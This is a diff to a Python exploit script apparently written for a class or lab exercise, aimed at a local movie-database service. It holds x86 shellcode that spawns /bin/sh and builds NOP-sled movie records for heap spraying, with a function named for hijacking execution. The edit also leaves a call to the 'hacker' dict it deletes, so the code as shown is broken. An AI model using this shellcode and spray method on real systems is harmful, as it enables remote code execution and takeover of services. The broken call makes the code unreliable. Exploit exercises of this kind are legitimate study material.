@@ -13,6 +13,7 @@ import time
 
 HOST = "localhost"
 PORT = "55000"
+NOP  = "\x90"
 
 # Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
 SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
@@ -136,6 +137,63 @@ def hijack_execution(con):
     else:
         print "Didn't delete :("
 
+################################################################################
+#
+#   build_nop_string
+#
+################################################################################
+def build_nop_string(size):
+    nop_string = ""
+
+    for i in range(0, size):
+        nop_string += NOP
+
+    return nop_string
+
+################################################################################
+#
+#   build_movie
+#
+################################################################################
+def build_movie():
+
+    title           = build_nop_string(500)
+    director        = build_nop_string(300)
+    star1           = build_nop_string(300)
+    star2           = build_nop_string(300)
+    star3           = build_nop_string(300)
+    star4           = build_nop_string(300)
+    star5           = build_nop_string(300)
+    summary         = build_nop_string(2000)
+    country         = build_nop_string(30)
+    budget          = build_nop_string(80)
+    opening_weekend = build_nop_string(80)
+    gross           = build_nop_string(80)
+    runtime         = build_nop_string(80)
+    aspect          = build_nop_string(40)
+    composer        = build_nop_string(300)
+    average_rating  = build_nop_string(3)
+
+    movie = {           
+              "title" : title,
+           "director" : director,
+              "star1" : star1,
+              "star2" : star2,
+              "star3" : star3,
+              "star4" : star4,
+              "star5" : star5,
+            "summary" : summary,
+            "country" : country,
+             "budget" : budget,
+    "opening_weekend" : opening_weekend,
+              "gross" : gross,
+            "runtime" : runtime,
+             "aspect" : aspect,
+           "composer" : composer,
+     "average_rating" : average_rating
+    }
+
+    return movie
 
 ################################################################################
 #
@@ -143,22 +201,6 @@ def hijack_execution(con):
 #
 ################################################################################
 
-hacker = {"title" : "Hackers",
-          "director" : "Iain Softley",
-          "star1" : "Jonny Lee Miller",
-          "star2" : "Angelina Jolie",
-          "star3" : "Jessie Bradford",
-          "star4" : "Matthew Lillard",
-          "star5" : "Laurence Mason",
-          "summary" : "A young boy is arrested by the US Secret Service for writing a computer virus and is banned from using a computer until his 18th birthday. Years later, he and his new-found friends discover a plot to unleash a dangerous computer virus, but they must use their computer skills to find the evidence while being pursued by the Secret Service and the evil computer genius behind the virus.",
-          "country" : "USA",
-          "budget" : "UNK",
-          "opening_weekend" : "UNK",
-          "gross" : "$7,564,000",
-          "runtime" : "107 min",
-          "aspect" : "2.35 : 1",
-          "composer" : "Someone",
-          "average_rating" : "5.0"}
 
 # Start the connection
 con = connect()
@@ -167,6 +209,7 @@ con = connect()
 pause_script()
 
 # Send the movie
+movie = build_movie()
 send_movie(hacker, con)
 
 # Create reviews to amplify the spray
